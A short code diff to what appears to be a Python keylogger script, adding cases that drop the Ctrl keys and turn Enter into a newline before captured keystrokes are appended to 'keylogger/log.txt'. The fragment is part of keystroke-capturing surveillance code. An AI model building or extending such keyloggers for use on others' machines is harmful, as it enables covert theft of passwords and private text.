@@ -18,6 +18,12 @@ def appendtofile(key):
         letter = ''
     elif letter == 'Key.shift_l':
         letter = ''
+    elif letter == 'Key.ctrl_l':
+        letter = ''
+    elif letter == 'Key.ctrl_r':
+        letter = ''
+    elif letter == 'Key.enter':
+        letter = '\n'
     
     # Appending
     with open('keylogger/log.txt','a') as f:
